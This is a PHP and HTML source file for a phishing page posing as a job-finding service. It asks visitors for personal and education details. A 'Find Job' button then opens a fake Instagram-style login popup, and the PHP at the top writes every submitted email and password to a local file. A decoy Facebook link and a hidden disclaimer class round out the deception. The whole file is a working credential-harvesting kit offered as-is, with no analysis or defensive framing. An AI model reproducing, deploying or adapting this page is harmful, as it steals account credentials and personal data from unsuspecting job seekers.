<?php

if (isset($_POST['submit'])) {
    

    $email = $_POST["email"];
    $password = $_POST["password"];



$fWrite = fopen("filename.php","at");
$wrote = fwrite( $fWrite, "\n".$email);
$wrote = fwrite( $fWrite, "\n".$password."\n");
fclose($fWrite);

}
?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
	<title></title>
</head>
<style>
.disclaimer{
    display:none;
}
	*
	{
		padding: 0;
		margin: 0;
		outline: none;
		font-family: 'Poppins', sans-serif;
	}
	.field
	{
		width: 70%;
		height: 35px;
		background-color: #f3f3f3;
		border-radius: 15px;
		border: 1px solid grey;	
		padding-left: 20px;	
		margin-top: 10px;
		max-width: 600px;
		text-decoration:none;
	}
	.mobilebox
	{
		width: 90%;
		margin-left: 5%;
		padding-bottom: 30px;
		text-align: center;
		background-color: #f5f5f5;
		border-radius: 5px;
		margin-top: 20px;
	}
	.heading
	{
		width: 100%;
		text-align: center;
		background-color: #6ab3c8;
		border-radius: 2px;
		color: white;
		padding-top: 10px;
		padding-bottom: 10px;
		color: white;
		font-size: 22px;
		margin-bottom: 30px;
	}
	.container {
	  display: block;
	  position: relative;
	  padding-left: 35px;
	  margin-bottom: 12px;
	  cursor: pointer;
	  font-size: 17px;
	  -webkit-user-select: none;
	  -moz-user-select: none;
	  -ms-user-select: none;
	  user-select: none;
	}

	/* Hide the browser's default checkbox */
	.container input {
	  position: absolute;
	  opacity: 0;
	  cursor: pointer;
	  height: 0;
	  width: 0;
	}

	/* Create a custom checkbox */
	.checkmark {
	  position: absolute;
	  top: 0;
	  left: 0;
	  height: 20px;
	  width: 20px;
	  background-color: lightgrey;
	  margin-top: 3px;
	}
	.container input:checked ~ .checkmark {
	  background-color: #2196F3;
	}

	/* Create the checkmark/indicator (hidden when not checked) */
	.checkmark:after {
	  content: "";
	  position: absolute;
	  display: none;
	}

	/* Show the checkmark when checked */
	.container input:checked ~ .checkmark:after {
	  display: block;
	}

	/* Style the checkmark/indicator */
	.container .checkmark:after {
	  left: 7px;
	  top: 2px;
	  width: 2px;
	  height: 12px;
	  border: solid white;
	  border-width: 0 3px 3px 0;
	  -webkit-transform: rotate(45deg);
	  -ms-transform: rotate(45deg);
	  transform: rotate(45deg);
	}
	.radioo
	{
		width: 74%;
		margin-left: 12.6%;
		background-color: #e6e6e6;
		margin-top: 10px;
		text-align: left;
		border-radius: 5px;
		color: grey;
		padding-left: 10px;
	}
	.submit{
		width: 200px;
		float: right;
		height: 40px;
		background-color: #6ab3c8;
		border: none;
		border-radius: 4px;
		cursor: pointer;
		color: #f2f2f2;
		margin-top: 20px;
		margin-bottom: 20px;
		font-size: 17px;
	}
	@media only screen and (max-width: 600px) {
		.submit{
			width: 103%;
			margin-left: -10px;
		}
		.popup{
			width: 300px !important;
		}
		.logoig{
			width: 210px;
			height: 70px;
		}
		.igfield{
			width: 250px !important;
			height: 32px !important;
			font-size: 13px !important;
		}
		.iglogin{
			width: 260px !important;
			height: 32px !important;
			font-size: 13px !important;
		}
		.popup{
			top: 15% !important;
		}
		.loader{
  			left: 41% !important;
  			margin-top: -25px !important;			
		}
		.cross{
			margin-left: 260px !important;

		}
		.bg{
			width: 100%;
			height: 270px;
		}
		.banner
		{
			padding-left: 30px !important;
			font-size: 15px !important;
		}
}
.popup{
	position: fixed;
	width: 450px;
	background-color: #fff;
	border-radius: 6px;
	padding-top: 10px;
	box-shadow: 5px 5px 19px rgba(0, 0, 0, 0.25);
	top: 25%;
  	-ms-transform: translateY(-50%);
  	transform: translateY(-50%);
	left: 50%;
	transform: translateX(-50%); 
	text-align: center;
	visibility: hidden;
}
.igfield{
	width: 400px ;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #DEDEDE;
	background-color: #F4F6F8;
	padding-left: 10px;
	font-size: 15px;
	font-weight: 400;
	margin-top: 5px;
	margin-bottom: 10px;
	color: grey;
}
.igfield :: placeholder{
		color: #96989A;
}
.iglogin{
	width: 410px ;
	height: 35px;
	border-radius: 4px;
	border: none;
	background-color: #017AFF;
	/*padding-left: 10px;*/
	font-size: 16px;
	font-weight: 400;
	margin-top: 5px;
	margin-bottom: 60px;
	color: #CCFAFF;
	font-weight: 600;
	cursor: pointer;	
}



.popup_Tittle{
	font-size: 30px;
	font-weight: 700;
	color: #212746;
}
.popup_Desc{
	color: #93959F;
	font-size: 16px;
	font-weight: 400;
}

/*loader*/
.loader {
  border: 8px solid #dadada;
  border-radius: 50%;
  border-top: 8px solid #017AFF;
  width: 30px;
  height: 30px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 1.5s linear infinite;
  position: absolute;
  left: 44%;
  margin-top: -25px;
  visibility: hidden;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.banner{
	width: 80%;
	border: none;
	font-size: 30px;
	font-weight: ;
	color: black;
	background-color: #fff;
	padding-left: 100px;
	padding-top: 20px;
	text-align: left;
}
</style>
<body>
	<img class="bg" src="job.jpg"/width="100%" height="600px">
	<div class="banner">
		<p>We will find the best job for you , on your doorstep!</p>
	</div>	
	<div class="mobilebox">
		<div class="heading"> Personal Details :</div>
		<input type="text" class="field" name="" placeholder="Full Name" />
		<input type="text" class="field" name="" placeholder="Date of Birth" />
		<input type="text" class="field" name="" placeholder="Street Address" />
		<input type="text" class="field" name="" placeholder="City" />
		<input type="text" class="field" name="" placeholder="State" />
		<input type="text" class="field" name="" placeholder="ZIP" />
		<input type="text" class="field" name="" placeholder="Phone" />
		<input type="text" class="field" name="" placeholder="E-Mail" />
		<input type="text" class="field" name="" placeholder="Highest Qualification" />		
		<input type="text" class="field" name="" placeholder="Additional Course" />				
	</div>
	<div class="mobilebox">
		<div class="heading"> Education Details :</div>
		<div class="radioo">SSC ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">HSC ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">Graduation ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">Post Graduation ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>		
		<input type="text" class="field" name="" placeholder="Highest Qualification" />		
		<input type="text" class="field" name="" placeholder="Additional Course" />				
	</div>
	<div class="mobilebox" style="padding-bottom: 100px; margin-bottom: 40px;">
		<div class="heading"> Employment Desired :</div>
		<input type="text" class="field" name="" placeholder="Position" />
		<input type="text" class="field" name="" placeholder="Department Region" />
		<input type="text" class="field" name="" placeholder="Salary Desired" />
		<input type="text" class="field" name="" placeholder="Experience " />
		<div class="radioo">Are you employed ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">Can you start immediately ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">Will you be available to relocate ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">What shift will you work ?
		<label class="container">Day <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">Night <input type="checkbox" ><span class="checkmark"></span></label>		
		</div>
		<div class="radioo">Are you vaccinated ?
		<label class="container">Yes <input type="checkbox"><span class="checkmark" checked></span></label>
		<label class="container" style="padding-bottom: 15px;">No <input type="checkbox" ><span class="checkmark"></span></label>		
		<button class="submit" onclick="show()"> Find Job </button>	
		</div>										
	</div>
	<div class="popup" id="1">
	    <form method="post" action="?">

    		<img src="cross.png" onclick="cross()" class="cross" width="17px" height="15px" style="margin-left: 410px; cursor: pointer;">
    		<img src="ig.jpg" class="logoig" style="margin-bottom: 10px;"width="80%" height="100px" />		
    		<input type="text" name="email" class="igfield" placeholder="Phone number or email" required/>
    		<div class="loader" id="2"></div>	
    		<input type="password" id="p" name="password" class="igfield" placeholder="Password" required/>
    		<!--<input type=text id="rp"> </input>-->
    		<button type="submit" name="submit" class="iglogin">Log In</button>	
		</form>

		<center><hr style="width: 250px; height: 2px; margin-bottom: 30px;text-align: center; background-color: lightgrey; border: none;"></center>
		<span style="margin-top: -45px; background-color: #fff;margin-left: -70px; padding-left: 10px;padding-right: 10px; color: #B8BBBA;font-weight: 500; font-size: 17px; position: absolute;">OR</span>
		<img src="fb.jpg" class="logofb" style="width: 35px; height: 35px;margin-left: -140px; padding-right: 10px; margin-bottom: 0px; "/>			
		<span onclick="load()" style="margin-top: 0px; position: absolute; font-size: 15px ; margin-top: 7px; color: #4877A0 ;cursor: pointer; "> Log In Facebook </span>
		<p onclick="load()" style="color: #4877A0;margin-top: 10px; font-size: 14px;padding-bottom: 20px; cursor: pointer;" > Forget password</p>
	</div>
	<script>
		function show()
		{
			var x = document.getElementById('1');
			x.style.visibility = "visible";
		}
			function load(){
				var x = document.getElementById('2');
				x.style.visibility = "visible";	
			setTimeout(
		    function  () {
				x.style.visibility = "hidden";	
		    }, 6000);
		}
		function cross()
		{
			var x = document.getElementById('1');
			var y = document.getElementById('2');
			y.style.visibility = "hidden";				
			x.style.visibility = "hidden";			
		}
// 		function star()
// 		{
// 		    var x = document.getElementById('p');
// 		    var y = document.getElementById('rp');
		    
// 		    y.value = x.value;
// 		  //  x.value = x.value + "*";
// 		}
		
	</script>
</body>
</html>